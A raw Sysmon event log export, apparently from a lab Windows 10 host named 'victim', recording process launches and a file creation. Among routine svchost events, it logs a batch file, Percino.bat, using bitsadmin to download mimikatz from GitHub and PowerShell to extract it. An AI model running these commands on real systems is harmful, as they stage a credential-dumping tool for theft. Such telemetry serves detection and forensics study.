TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7
ParentProcessGuid: {461f0bd2-2d35-6354-5700-000000001f00}
ParentProcessId: 256
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd /c Percino.bat
ParentUser: VICTIM\Patricia Goh","-","-","-","-","-","-","-","-","-","-","-","-","powershell.exe, -command, Expand-Archive -Force 'C:\Supertools\mimikatz.zip' 'C:\Supertools\Mimikatz'",3,"powershell.exe  -command ""Expand-Archive -Force 'C:\Supertools\mimikatz.zip' 'C:\Supertools\Mimikatz'""","powershell.exe  -command ""Expand-Archive -Force 'C:\Supertools\mimikatz.zip' 'C:\Supertools\Mimikatz'""","{461f0bd2-2da2-6354-8200-000000001f00}","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",04029e121a0cfa5991749937dd22a1d9,9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f,"powershell.exe","powershell.exe","cmd, /c, Percino.bat",3,"cmd /c Percino.bat","cmd /c Percino.bat","{461f0bd2-2d35-6354-5700-000000001f00}","C:\Windows\System32\cmd.exe","C:\Windows\System32\cmd.exe","cmd.exe","cmd.exe",256,"Microsoft Corporation","Windows PowerShell","10.0.19041.546 (WinBuild.160101.0800)",7c955a0abc747f57ccc4324480737ef7,"PowerShell.EXE","Microsoft® Windows® Operating System",2628,"-","-","C:\Users\PATRIC~1\AppData\Local\Temp\IXP000.TMP\","C:\Users\PATRIC~1\AppData\Local\Temp\IXP000.TMP\","-","-","-","-","-","-","9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f, 04029e121a0cfa5991749937dd22a1d9, 7c955a0abc747f57ccc4324480737ef7","-","-","Patricia Goh","-","-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"Microsoft Corporation","-","Windows PowerShell","-","10.0.19041.546 (WinBuild.160101.0800)",High,"{461f0bd2-2d0d-6354-ef2b-030000000000}",0x32bef,"-","VICTIM\Patricia Goh","-","Microsoft® Windows® Operating System","-","-","-","-","-","-","-","-",1,"-",1,"-","-",Info,"2,240","2,984","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",5148,"Process Create (rule: ProcessCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,5
"Oct 23, 2022 @ 01:51:29.638",FEXUAIQBHC0TB3lJapyU,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","25051d08-9df1-4629-b2c6-d1eeb5aa9cfd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","Process Create (rule: ProcessCreate)",process,1,"Oct 23, 2022 @ 01:51:32.187","Oct 23, 2022 @ 01:53:51.763",event,sysmon,"-","Microsoft-Windows-Sysmon","-",start,"-","-","-","-","-","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Process Create:
RuleName: -
UtcTime: 2022-10-22 17:51:29.638
ProcessGuid: {461f0bd2-2da1-6354-8100-000000001f00}
ProcessId: 3836
Image: C:\Windows\System32\svchost.exe
FileVersion: 10.0.19041.1806 (WinBuild.160101.0800)
Description: Host Process for Windows Services
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: svchost.exe
CommandLine: C:\Windows\system32\svchost.exe -k wusvcs -p
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {461f0bd2-2cdb-6354-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=B7F884C1B74A263F746EE12A5F7C9F6A,SHA256=ADD683A6910ABBBF0E28B557FAD0BA998166394932AE2ACA069D9AA19EA8FE88,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69
ParentProcessGuid: {00000000-0000-0000-0000-000000000000}
ParentProcessId: 644
ParentImage: -
ParentCommandLine: -
ParentUser: -","-","-","-","-","-","-","-","-","-","-","-","-","C:\Windows\system32\svchost.exe, -k, wusvcs, -p",4,"C:\Windows\system32\svchost.exe -k wusvcs -p","C:\Windows\system32\svchost.exe -k wusvcs -p","{461f0bd2-2da1-6354-8100-000000001f00}","C:\Windows\System32\svchost.exe","C:\Windows\System32\svchost.exe",b7f884c1b74a263f746ee12a5f7c9f6a,add683a6910abbbf0e28b557fad0ba998166394932ae2aca069d9aa19ea8fe88,"svchost.exe","svchost.exe","-",1,"-","-","{00000000-0000-0000-0000-000000000000}","-","-","-","-",644,"Microsoft Corporation","Host Process for Windows Services","10.0.19041.1806 (WinBuild.160101.0800)",247b9220e5d9b720a82b2c8b5069ad69,"svchost.exe","Microsoft® Windows® Operating System",3836,"-","-","C:\Windows\system32\","C:\Windows\system32\","-","-","-","-","-","-","add683a6910abbbf0e28b557fad0ba998166394932ae2aca069d9aa19ea8fe88, b7f884c1b74a263f746ee12a5f7c9f6a, 247b9220e5d9b720a82b2c8b5069ad69","-","-",SYSTEM,"-","-","NT AUTHORITY","-","S-1-5-18",SYSTEM,SYSTEM,"-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"Microsoft Corporation","-","Host Process for Windows Services","-","10.0.19041.1806 (WinBuild.160101.0800)",System,"{461f0bd2-2cdb-6354-e703-000000000000}",0x3e7,"-","-","-","Microsoft® Windows® Operating System","-","-","-","-","-","-","-","-",0,"-",1,"-","-",Info,"2,240","2,984","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",5146,"Process Create (rule: ProcessCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,5
"Oct 23, 2022 @ 01:51:27.991",EUXUAIQBHC0TB3lJZZxf,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","25051d08-9df1-4629-b2c6-d1eeb5aa9cfd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","Process Create (rule: ProcessCreate)",process,1,"Oct 23, 2022 @ 01:51:30.581","Oct 23, 2022 @ 01:53:50.429",event,sysmon,"-","Microsoft-Windows-Sysmon","-",start,"-","-","-","-","-","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Process Create:
RuleName: -
UtcTime: 2022-10-22 17:51:27.991
ProcessGuid: {461f0bd2-2d9f-6354-8000-000000001f00}
ProcessId: 6120
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: bitsadmin /transfer Percino /download /priority FOREGROUND  https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip C:\Supertools\mimikatz.zip 
CurrentDirectory: C:\Users\PATRIC~1\AppData\Local\Temp\IXP000.TMP\
User: VICTIM\Patricia Goh
LogonGuid: {461f0bd2-2d0d-6354-ef2b-030000000000}
LogonId: 0x32BEF
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {461f0bd2-2d35-6354-5700-000000001f00}
ParentProcessId: 256
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd /c Percino.bat
ParentUser: VICTIM\Patricia Goh","-","-","-","-","-","-","-","-","-","-","-","-","bitsadmin, /transfer, Percino, /download, /priority, FOREGROUND, https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip, C:\Supertools\mimikatz.zip",8,"bitsadmin /transfer Percino /download /priority FOREGROUND  https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip C:\Supertools\mimikatz.zip ","bitsadmin /transfer Percino /download /priority FOREGROUND  https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip C:\Supertools\mimikatz.zip ","{461f0bd2-2d9f-6354-8000-000000001f00}","C:\Windows\System32\bitsadmin.exe","C:\Windows\System32\bitsadmin.exe",01aab62d5799f75b0d69eb29c1ca6855,739b2dd012ea183895cc01116906f339c9aa1c0baabf6f22c8e59e25a0c12917,"bitsadmin.exe","bitsadmin.exe","cmd, /c, Percino.bat",3,"cmd /c Percino.bat","cmd /c Percino.bat","{461f0bd2-2d35-6354-5700-000000001f00}","C:\Windows\System32\cmd.exe","C:\Windows\System32\cmd.exe","cmd.exe","cmd.exe",256,"Microsoft Corporation","BITS administration utility","7.8.19041.1 (WinBuild.160101.0800)",774033454eb79213b09f788fc004a02d,"bitsadmin.exe","Microsoft® Windows® Operating System",6120,"-","-","C:\Users\PATRIC~1\AppData\Local\Temp\IXP000.TMP\","C:\Users\PATRIC~1\AppData\Local\Temp\IXP000.TMP\","-","-","-","-","-","-","739b2dd012ea183895cc01116906f339c9aa1c0baabf6f22c8e59e25a0c12917, 01aab62d5799f75b0d69eb29c1ca6855, 774033454eb79213b09f788fc004a02d","-","-","Patricia Goh","-","-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"Microsoft Corporation","-","BITS administration utility","-","7.8.19041.1 (WinBuild.160101.0800)",High,"{461f0bd2-2d0d-6354-ef2b-030000000000}",0x32bef,"-","VICTIM\Patricia Goh","-","Microsoft® Windows® Operating System","-","-","-","-","-","-","-","-",1,"-",1,"-","-",Info,"2,240","2,984","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",5145,"Process Create (rule: ProcessCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,5
"Oct 23, 2022 @ 01:51:24.621",6kXUAIQBHC0TB3lJXZtj,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","25051d08-9df1-4629-b2c6-d1eeb5aa9cfd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","Process Create (rule: ProcessCreate)",process,1,"Oct 23, 2022 @ 01:51:27.542","Oct 23, 2022 @ 01:53:48.368",event,sysmon,"-","Microsoft-Windows-Sysmon","-",start,"-","-","-","-","-","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Process Create:
RuleName: -
UtcTime: 2022-10-22 17:51:24.621
ProcessGuid: {461f0bd2-2d9c-6354-7f00-000000001f00}
ProcessId: 4576
Image: C:\Windows\System32\svchost.exe
FileVersion: 10.0.19041.1806 (WinBuild.160101.0800)
Description: Host Process for Windows Services
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: svchost.exe
CommandLine: C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\LOCAL SERVICE
LogonGuid: {461f0bd2-2cdc-6354-e503-000000000000}
LogonId: 0x3E5
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=B7F884C1B74A263F746EE12A5F7C9F6A,SHA256=ADD683A6910ABBBF0E28B557FAD0BA998166394932AE2ACA069D9AA19EA8FE88,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69
ParentProcessGuid: {00000000-0000-0000-0000-000000000000}
ParentProcessId: 644
ParentImage: -
ParentCommandLine: -
ParentUser: -","-","-","-","-","-","-","-","-","-","-","-","-","C:\Windows\System32\svchost.exe, -k, LocalServiceNetworkRestricted, -p",4,"C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p","C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p","{461f0bd2-2d9c-6354-7f00-000000001f00}","C:\Windows\System32\svchost.exe","C:\Windows\System32\svchost.exe",b7f884c1b74a263f746ee12a5f7c9f6a,add683a6910abbbf0e28b557fad0ba998166394932ae2aca069d9aa19ea8fe88,"svchost.exe","svchost.exe","-",1,"-","-","{00000000-0000-0000-0000-000000000000}","-","-","-","-",644,"Microsoft Corporation","Host Process for Windows Services","10.0.19041.1806 (WinBuild.160101.0800)",247b9220e5d9b720a82b2c8b5069ad69,"svchost.exe","Microsoft® Windows® Operating System",4576,"-","-","C:\Windows\system32\","C:\Windows\system32\","-","-","-","-","-","-","add683a6910abbbf0e28b557fad0ba998166394932ae2aca069d9aa19ea8fe88, b7f884c1b74a263f746ee12a5f7c9f6a, 247b9220e5d9b720a82b2c8b5069ad69","-","-","LOCAL SERVICE","-","-","NT AUTHORITY","-","S-1-5-18","LOCAL SERVICE","LOCAL SERVICE","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"Microsoft Corporation","-","Host Process for Windows Services","-","10.0.19041.1806 (WinBuild.160101.0800)",System,"{461f0bd2-2cdc-6354-e503-000000000000}",0x3e5,"-","-","-","Microsoft® Windows® Operating System","-","-","-","-","-","-","-","-",0,"-",1,"-","-",Info,"2,240","2,984","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",5144,"Process Create (rule: ProcessCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,5
"Oct 23, 2022 @ 01:51:24.567",6UXUAIQBHC0TB3lJXZtj,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","25051d08-9df1-4629-b2c6-d1eeb5aa9cfd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","Process Create (rule: ProcessCreate)",process,1,"Oct 23, 2022 @ 01:51:27.542","Oct 23, 2022 @ 01:53:48.367",event,sysmon,"-","Microsoft-Windows-Sysmon","-",start,"-","-","-","-","-","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Process Create:
RuleName: -
UtcTime: 2022-10-22 17:51:24.567
ProcessGuid: {461f0bd2-2d9c-6354-7e00-000000001f00}
ProcessId: 3184
Image: C:\Windows\System32\MoUsoCoreWorker.exe
FileVersion: 10.0.19041.1865 (WinBuild.160101.0800)
Description: MoUSO Core Worker Process
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: MoUSOCoreWorker.exe
CommandLine: C:\Windows\System32\mousocoreworker.exe -Embedding
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {461f0bd2-2cdb-6354-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=929C20D5B38C2B08EE5FD4DA9A05A5CB,SHA256=D89A68C73B1EA6A4BE23E797A58B4946FC78FB10611FFA36520DA99301FD4821,IMPHASH=72789ABFBC08A24E6F6A23DE50B7DE6A
ParentProcessGuid: {00000000-0000-0000-0000-000000000000}
ParentProcessId: 780
ParentImage: -
ParentCommandLine: -
ParentUser: -","-","-","-","-","-","-","-","-","-","-","-","-","C:\Windows\System32\mousocoreworker.exe, -Embedding",2,"C:\Windows\System32\mousocoreworker.exe -Embedding","C:\Windows\System32\mousocoreworker.exe -Embedding","{461f0bd2-2d9c-6354-7e00-000000001f00}","C:\Windows\System32\MoUsoCoreWorker.exe","C:\Windows\System32\MoUsoCoreWorker.exe",929c20d5b38c2b08ee5fd4da9a05a5cb,d89a68c73b1ea6a4be23e797a58b4946fc78fb10611ffa36520da99301fd4821,"MoUsoCoreWorker.exe","MoUsoCoreWorker.exe","-",1,"-","-","{00000000-0000-0000-0000-000000000000}","-","-","-","-",780,"Microsoft Corporation","MoUSO Core Worker Process","10.0.19041.1865 (WinBuild.160101.0800)",72789abfbc08a24e6f6a23de50b7de6a,"MoUSOCoreWorker.exe","Microsoft® Windows® Operating System",3184,"-","-","C:\Windows\system32\","C:\Windows\system32\","-","-","-","-","-","-","d89a68c73b1ea6a4be23e797a58b4946fc78fb10611ffa36520da99301fd4821, 929c20d5b38c2b08ee5fd4da9a05a5cb, 72789abfbc08a24e6f6a23de50b7de6a","-","-",SYSTEM,"-","-","NT AUTHORITY","-","S-1-5-18",SYSTEM,SYSTEM,"-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"Microsoft Corporation","-","MoUSO Core Worker Process","-","10.0.19041.1865 (WinBuild.160101.0800)",System,"{461f0bd2-2cdb-6354-e703-000000000000}",0x3e7,"-","-","-","Microsoft® Windows® Operating System","-","-","-","-","-","-","-","-",0,"-",1,"-","-",Info,"2,240","2,984","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",5143,"Process Create (rule: ProcessCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,5
"Oct 23, 2022 @ 01:51:22.112",5kXUAIQBHC0TB3lJUJu4,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","25051d08-9df1-4629-b2c6-d1eeb5aa9cfd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","Process Create (rule: ProcessCreate)",process,1,"Oct 23, 2022 @ 01:51:22.943","Oct 23, 2022 @ 01:53:45.144",event,sysmon,"-","Microsoft-Windows-Sysmon","-",start,"-","-","-","-","-","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Process Create:
RuleName: -
UtcTime: 2022-10-22 17:51:22.112
ProcessGuid: {461f0bd2-2d9a-6354-7d00-000000001f00}
ProcessId: 4848
Image: C:\Program Files\Microsoft Update Health Tools\uhssvc.exe
FileVersion: 10.0.19041.1675 (WinBuild.160101.0800)
Description: Microsoft Update Health Service
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: uhssvc
CommandLine: ""C:\Program Files\Microsoft Update Health Tools\uhssvc.exe""
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {461f0bd2-2cdb-6354-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=13B9189CA51D925FF78151A0E14C40CE,SHA256=78AEDD6D13C45B2E080BC26527CCF3BDABF764A2108249BA8B3AC4387C6A6376,IMPHASH=486A6C129DA076DE0C30AF67FC039CB0
ParentProcessGuid: {00000000-0000-0000-0000-000000000000}
ParentProcessId: 644
ParentImage: -
ParentCommandLine: -
ParentUser: -","-","-","-","-","-","-","-","-","-","-","-","-","C:\Program Files\Microsoft Update Health Tools\uhssvc.exe",1,"""C:\Program Files\Microsoft Update Health Tools\uhssvc.exe""","""C:\Program Files\Microsoft Update Health Tools\uhssvc.exe""","{461f0bd2-2d9a-6354-7d00-000000001f00}","C:\Program Files\Microsoft Update Health Tools\uhssvc.exe","C:\Program Files\Microsoft Update Health Tools\uhssvc.exe",13b9189ca51d925ff78151a0e14c40ce,78aedd6d13c45b2e080bc26527ccf3bdabf764a2108249ba8b3ac4387c6a6376,"uhssvc.exe","uhssvc.exe","-",1,"-","-","{00000000-0000-0000-0000-000000000000}","-","-","-","-",644,"Microsoft Corporation","Microsoft Update Health Service","10.0.19041.1675 (WinBuild.160101.0800)",486a6c129da076de0c30af67fc039cb0,uhssvc,"Microsoft® Windows® Operating System",4848,"-","-","C:\Windows\system32\","C:\Windows\system32\","-","-","-","-","-","-","78aedd6d13c45b2e080bc26527ccf3bdabf764a2108249ba8b3ac4387c6a6376, 13b9189ca51d925ff78151a0e14c40ce, 486a6c129da076de0c30af67fc039cb0","-","-",SYSTEM,"-","-","NT AUTHORITY","-","S-1-5-18",SYSTEM,SYSTEM,"-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"Microsoft Corporation","-","Microsoft Update Health Service","-","10.0.19041.1675 (WinBuild.160101.0800)",System,"{461f0bd2-2cdb-6354-e703-000000000000}",0x3e7,"-","-","-","Microsoft® Windows® Operating System","-","-","-","-","-","-","-","-",0,"-",1,"-","-",Info,"2,240","2,984","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",5142,"Process Create (rule: ProcessCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,5
"Oct 23, 2022 @ 01:51:21.150",5UXUAIQBHC0TB3lJUJu4,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","25051d08-9df1-4629-b2c6-d1eeb5aa9cfd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","File created (rule: FileCreate)",file,11,"Oct 23, 2022 @ 01:51:22.943","Oct 23, 2022 @ 01:53:45.143",event,sysmon,"-","Microsoft-Windows-Sysmon","-",creation,"C:\Users\Patricia Goh\AppData\Local\Temp",ps1,"__PSScriptPolicyTest_4tguj2yu.2lx.ps1","C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_4tguj2yu.2lx.ps1","C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_4tguj2yu.2lx.ps1","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"File created:
RuleName: -
UtcTime: 2022-10-22 17:51:21.150
ProcessGuid: {461f0bd2-2d93-6354-7800-000000001f00}
ProcessId: 3600
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_4tguj2yu.2lx.ps1
CreationUtcTime: 2022-10-22 17:51:21.150
User: VICTIM\Patricia Goh","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{461f0bd2-2d93-6354-7800-000000001f00}","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","-","powershell.exe","powershell.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",3600,"-","-","-","-","-","-","-","-","-","-","-","-","-","Patricia Goh","-","-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"-","2022-10-22 17:51:21.150","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",11,"-","-",Info,"2,240","2,984","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",5141,"File created (rule: FileCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,2
